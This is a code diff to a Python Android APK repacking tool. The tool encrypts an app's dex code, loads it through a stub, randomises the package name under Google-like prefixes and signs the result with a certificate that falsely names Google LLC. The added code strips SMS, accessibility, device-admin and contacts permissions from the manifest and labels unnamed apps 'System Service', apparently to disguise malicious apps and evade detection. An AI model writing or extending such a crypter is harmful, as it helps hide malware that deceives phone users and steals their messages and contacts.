@@ -13,12 +13,21 @@ _PKG_PREFIXES = [
     "com.google.android","com.android.providers",
 ]
 
+_STRIP_PERMS = [
+    "READ_SMS","RECEIVE_SMS","SEND_SMS","READ_MMS",
+    "BIND_ACCESSIBILITY_SERVICE","SYSTEM_ALERT_WINDOW",
+    "READ_CONTACTS","WRITE_CONTACTS","READ_CALL_LOG",
+    "WRITE_CALL_LOG","PROCESS_OUTGOING_CALLS",
+    "READ_PHONE_STATE","BIND_DEVICE_ADMIN",
+    "RECEIVE_BOOT_COMPLETED","FOREGROUND_SERVICE",
+]
+
 def find_tool(name):
     t = shutil.which(name)
     if t: return t
     for p in glob.glob(f"/opt/android-sdk/build-tools/*/{name}"):
         return p
-    raise FileNotFoundError(f"{name} nao encontrado no sistema")
+    raise FileNotFoundError(f"{name} nao encontrado")
 
 def random_package():
     return f"{random.choice(_PKG_PREFIXES)}.{''.join(random.choices(string.ascii_lowercase,k=6))}"
@@ -28,13 +37,20 @@ def encrypt_dex(dex_bytes):
     enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(dex_bytes, AES.block_size))
     return enc, key+iv
 
+def strip_permissions(txt):
+    for perm in _STRIP_PERMS:
+        txt = re.sub(r'<uses-permission[^>]*android\.permission\.' + perm + r'[^/]*/>', '', txt)
+        txt = re.sub(r'<uses-permission[^>]*android\.permission\.' + perm + r'[^>]*/>', '', txt)
+    return txt
+
 def ensure_keystore():
     if not KEYSTORE.exists():
+        dname = "CN=Google LLC,OU=Android,O=Google LLC,L=Mountain View,S=California,C=US"
         subprocess.run(["keytool","-genkeypair","-v",
             "-keystore",str(KEYSTORE),"-storepass","bypass123",
             "-keypass","bypass123","-alias","bypass",
             "-keyalg","RSA","-keysize","2048",
-            "-dname","CN=Android,OU=Android,O=Android,L=MV,S=CA,C=US",
+            "-dname", dname,
             "-validity","10000"], check=True, capture_output=True)
 
 def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playstore"):
@@ -47,8 +63,10 @@ def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playsto
                                  if n.startswith("classes") and n.endswith(".dex"))
         enc_dex, key_iv = encrypt_dex(dex_bytes)
 
-        subprocess.run(["apktool","d",input_apk,"-o",decoded,"--force"],
-                       check=True, capture_output=True)
+        r_d = subprocess.run(["apktool","d",input_apk,"-o",decoded,"--force"],
+                       capture_output=True)
+        if r_d.returncode != 0:
+            raise RuntimeError(f"apktool decode falhou:\n{r_d.stdout.decode(errors='replace')}\n{r_d.stderr.decode(errors='replace')}")
 
         manifest = os.path.join(decoded,"AndroidManifest.xml")
         raw = open(manifest, encoding="utf-8", errors="replace").read()
@@ -75,11 +93,14 @@ def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playsto
                 shutil.copy(str(so), os.path.join(lib_dir,"libhooks.so"))
 
         txt = open(manifest, encoding="utf-8", errors="replace").read()
+        txt = strip_permissions(txt)
         txt = txt.replace(f'package="{orig_pkg}"', f'package="{new_pkg}"')
         txt = re.sub(r'android:name="[^"]*Application"',
                      'android:name="com.stub.loader.StubApplication"', txt)
         if app_name:
             txt = re.sub(r'android:label="[^"]*"', f'android:label="{app_name}"', txt, count=1)
+        else:
+            txt = re.sub(r'android:label="[^"]*"', 'android:label="System Service"', txt, count=1)
         if "installLocation" not in txt:
             txt = txt.replace("<manifest ", '<manifest android:installLocation="preferExternal" ', 1)
         open(manifest, "w", encoding="utf-8").write(txt)
@@ -94,8 +115,10 @@ def repack(input_apk, output_apk, app_name=None, icon_path=None, visual="playsto
         unsigned = str(job/"unsigned.apk")
         aligned  = str(job/"aligned.apk")
 
-        subprocess.run(["apktool","b",decoded,"-o",unsigned,"--force-all"],
-                       check=True, capture_output=True)
+        r_b = subprocess.run(["apktool","b",decoded,"-o",unsigned,"--force-all"],
+                       capture_output=True)
+        if r_b.returncode != 0:
+            raise RuntimeError(f"apktool build falhou:\n{r_b.stdout.decode(errors='replace')[-3000:]}\n{r_b.stderr.decode(errors='replace')[-1000:]}")
 
         zipalign = find_tool("zipalign")
         subprocess.run([zipalign,"-f","4",unsigned,aligned],
